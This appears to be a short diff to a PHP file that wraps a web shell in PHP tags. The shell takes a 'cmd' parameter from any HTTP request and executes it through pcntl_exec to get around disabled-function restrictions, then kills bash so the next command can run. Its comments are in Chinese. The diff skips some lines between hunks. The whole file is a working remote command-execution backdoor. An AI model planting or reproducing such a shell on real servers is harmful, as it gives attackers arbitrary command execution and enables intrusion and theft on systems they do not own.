@@ -1,3 +1,4 @@
+<?php
 $cmd = @$_REQUEST[cmd];
 if(function_exists('pcntl_exec')) {
     $cmd = $cmd."&pkill -9 bash >out"; //执行完毕当前的命令。结束掉bash，方便下一次继续执行
@@ -6,3 +7,4 @@ if(function_exists('pcntl_exec')) {
 } else {
         echo '不支持pcntl扩展';
 }
+?>
